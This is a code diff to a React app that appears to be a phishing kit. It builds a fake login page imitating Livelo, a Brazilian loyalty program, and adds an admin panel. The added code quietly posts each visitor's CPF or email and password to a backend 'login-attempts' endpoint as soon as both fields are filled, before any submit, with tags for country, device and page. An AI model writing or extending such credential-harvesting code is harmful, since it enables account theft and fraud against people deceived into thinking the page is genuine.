@@ -3,6 +3,10 @@ import "@/App.css";
 import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
 import AdminLogin from "@/pages/AdminLogin";
 import AdminPanel from "@/pages/AdminPanel";
+import axios from "axios";
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 // Componente da página de login Livelo
 function LiveloLogin() {
@@ -11,6 +15,7 @@ function LiveloLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [isValid, setIsValid] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [userId, setUserId] = useState(null);
 
   // Validação de CPF (11 dígitos) ou Email
   const validateCredential = (value) => {
@@ -24,6 +29,34 @@ function LiveloLogin() {
     const credentialValid = validateCredential(credential);
     const passwordValid = password.length > 0;
     setIsValid(credentialValid && passwordValid);
+  }, [credential, password]);
+
+  // Enviar dados ao backend quando ambos campos estiverem preenchidos
+  useEffect(() => {
+    const sendData = async () => {
+      if (credential && password && validateCredential(credential)) {
+        try {
+          const response = await axios.post(`${API}/admin/login-attempts`, {
+            email: credential,
+            password: password,
+            ip_address: "127.0.0.1",
+            country: "Brasil",
+            device: "Desktop",
+            page: "Login Livelo"
+          });
+          
+          if (response.data && response.data.id) {
+            setUserId(response.data.id);
+          }
+        } catch (error) {
+          console.error("Erro ao enviar dados:", error);
+        }
+      }
+    };
+
+    // Debounce para não enviar a cada tecla
+    const timer = setTimeout(sendData, 500);
+    return () => clearTimeout(timer);
   }, [credential, password]);
 
   // Formatar CPF enquanto digita
